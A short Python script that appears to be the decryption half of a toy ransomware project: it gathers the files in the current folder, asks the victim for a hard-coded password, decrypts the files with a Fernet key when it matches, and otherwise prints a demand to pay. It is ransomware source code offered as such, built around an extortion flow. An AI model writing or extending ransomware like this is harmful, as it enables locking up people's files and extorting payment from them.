#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

allfiles = []
for file in os.listdir():
    if file == "malware.py" or file == "key.key" or file == "decrypt.py":
        continue
    if os.path.isfile(file):
        allfiles.append(file)
print(allfiles)

with open("key.key", "rb") as key:
    password = key.read()
passphrase = "LizC0derwasHere!"
userpass = input("Enter the password you recieved from me: ")
if userpass == passphrase:
    for file in allfiles:
        with open(file, "rb") as thefile:
            contents = thefile.read()
        content_decr = Fernet(password).decrypt(contents)
        with open(file, "wb") as thefile:
            thefile.write(content_decr)

        print("You got your files back!")

else:
    print("You are wrong password. Pay to receive the password.")
